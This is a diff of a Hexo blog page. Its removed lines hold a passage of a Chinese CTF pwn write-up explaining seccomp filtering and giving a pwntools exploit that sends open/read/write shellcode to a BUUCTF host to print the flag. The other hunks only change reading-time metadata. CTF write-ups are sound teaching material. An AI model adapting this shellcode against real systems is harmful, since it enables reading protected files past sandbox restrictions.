-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">prctl_set_seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> seccomp_mode, <span class="type">void</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">	<span class="type">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">		op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Setting strict mode through prctl always ignored filter,</span></span><br><span class="line"><span class="comment">		 * so make sure it is always NULL here to pass the internal</span></span><br><span class="line"><span class="comment">		 * check in do_seccomp().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		uargs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">		op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">		uargs = filter;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* prctl interface doesn&#x27;t have flags, so they are always zero. */</span></span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>其中switch的宏定义如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_DISABLED	0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_STRICT	1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_MODE_FILTER	2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure>
-<p>程序中传入的第二个参数为2，表示seccomp为过滤器模式。<br />
-之后查看源码发现传入的参数为一个结构体，内含长度与指令，指令用于seccomp沙箱。也就是说seccomp最终的执行方式是一种沙箱（vm）。直接手动分析可能较为困难，但有工具seccomp-tools帮助我们分析这些并输出结果（<a target="_blank" rel="noopener" href="https://blog.csdn.net/am_03/article/details/119870152?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=seccomp-tools&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-119870152.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&amp;spm=1018.2226.3001.4187">安装方法</a>）</p>
-<p><img src="https://img-blog.csdnimg.cn/13b5d93da39d4bb889fea9cfd1fbdeaf.png" alt="" /><br />
-可以看到输出把允许的系统调用用绿色标了出来，允许open、read、write。因此直接用open打开flag文件，读取若干字节到某个地址之后再写出来就可以了。这里选择将数据写在栈上，简单方便。</p>
-<p>其中使用到了三个系统调用，32位x86的系统调用号以及使用的参数表在<a target="_blank" rel="noopener" href="https://blog.csdn.net/Nashi_Ko/article/details/120288385?spm=1001.2014.3001.5506">这里</a>查询</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27084</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;push 0x0;&#x27;</span>			<span class="comment"># string ends</span></span><br><span class="line">payload += <span class="string">&#x27;push 0x67616c66;&#x27;</span>	<span class="comment"># string &#x27;flag&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,esp;&#x27;</span>		<span class="comment"># second argument of syscall &#x27;open&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov eax,5;&#x27;</span>			<span class="comment"># syscall code 5: open</span></span><br><span class="line">payload += <span class="string">&#x27;xor ecx,ecx;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;xor edx,edx;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span>			<span class="comment"># open file &#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;mov eax,3;&#x27;</span>			<span class="comment"># syscall code 3: read</span></span><br><span class="line">payload += <span class="string">&#x27;mov ecx,ebx;&#x27;</span>		<span class="comment"># read file &#x27;./flag&#x27; to stack (ebx==esp now)</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,3;&#x27;</span>			<span class="comment"># fd, 0 =&gt; stdin, 1 =&gt; stdout, 2 =&gt; stderr, &gt;=3 =&gt; others</span></span><br><span class="line">payload += <span class="string">&#x27;mov edx,0x100;&#x27;</span>		<span class="comment"># readsize, choose 0x100</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span>			<span class="comment"># read file &#x27;./flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;mov eax,4;&#x27;</span>			<span class="comment"># syscall code 4: write</span></span><br><span class="line">payload += <span class="string">&#x27;mov ecx,esp;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;mov ebx,1;&#x27;</span>			<span class="comment"># second argument of syscall &#x27;write&#x27;: fd for stdout</span></span><br><span class="line">payload += <span class="string">&#x27;mov edx,0x100;&#x27;</span>		<span class="comment"># write size, choose 0x100</span></span><br><span class="line">payload += <span class="string">&#x27;int 0x80;&#x27;</span>			<span class="comment"># syscall code 4: write</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm(payload))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Give my your shellcode:&#x27;</span>, asm(payload))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -325,14 +197,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>7.2k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>7 mins.</span>
             </span>
 
         </div>
@@ -437,14 +309,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>9.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>9 mins.</span>
             </span>
 
         </div>
@@ -615,14 +487,14 @@ exp：</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>8.9k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>8 mins.</span>
             </span>
 
         </div>
@@ -747,14 +619,14 @@ exp：</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>3.6k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>3 mins.</span>
             </span>
 
         </div>
@@ -863,14 +735,14 @@ exp：</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>2 mins.</span>
             </span>
 
         </div>
@@ -968,14 +840,14 @@ exp：</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>1.1k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>1 mins.</span>
             </span>
 
         </div>
@@ -1076,14 +948,14 @@ exp：</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span></span>
+              <span>6.8k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>NaN:aN</span>
+              <span>6 mins.</span>
             </span>
 
         </div>
@@ -1321,7 +1193,7 @@ exp：</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-count">77</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1373,13 +1245,13 @@ exp：</p>
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">NaNm</span>
+    <span title="Symbols count total">832k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">NaN:aN</span>
+    <span title="Reading time total">12:37</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
